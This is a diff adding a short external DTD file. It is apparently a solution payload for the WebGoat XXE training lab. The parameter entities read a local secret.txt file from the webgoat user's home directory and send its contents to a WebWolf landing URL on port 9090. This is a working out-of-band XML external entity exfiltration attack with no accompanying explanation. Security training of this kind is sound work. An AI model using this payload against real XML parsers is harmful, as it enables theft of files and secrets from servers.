@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-2026.5/XXE/abdelbaki/secret.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://127.0.0.1:9090/WebWolf/landing?text=%file;'>">
+%eval;
+%exfiltrate;
